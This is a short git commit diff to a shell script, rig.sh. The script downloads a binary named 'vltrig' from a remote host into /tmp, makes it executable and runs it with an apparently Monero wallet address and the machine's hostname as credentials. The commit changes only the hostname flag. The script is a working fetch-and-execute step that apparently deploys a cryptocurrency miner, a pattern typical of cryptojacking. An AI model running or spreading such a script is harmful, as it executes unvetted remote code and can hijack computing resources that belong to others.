3c929551666164340a0275fab5587367888dc010
ivanhi0 <idbod@ivanhi0.ru>
2026-04-10 19:36:01 +0300

    Change wrong parametr

--- rig.sh
+++ rig.sh
@@ -3,4 +3,4 @@
 cd /tmp
 wget https://bio.ivanhi0.ru/vltrig
 chmod +x ./vltrig
-vltrig --user 42zHmvjLFQf6nLHbVCzm5RNxwovafb9mbPhYixC9ynFn29uxjGfPY3Z1BM5e2RXdnyiZCcujqznUoJ7AfPQpy4BPU7UrCJb --pass $(hostname -i)
+vltrig --user 42zHmvjLFQf6nLHbVCzm5RNxwovafb9mbPhYixC9ynFn29uxjGfPY3Z1BM5e2RXdnyiZCcujqznUoJ7AfPQpy4BPU7UrCJb --pass $(hostname -b)
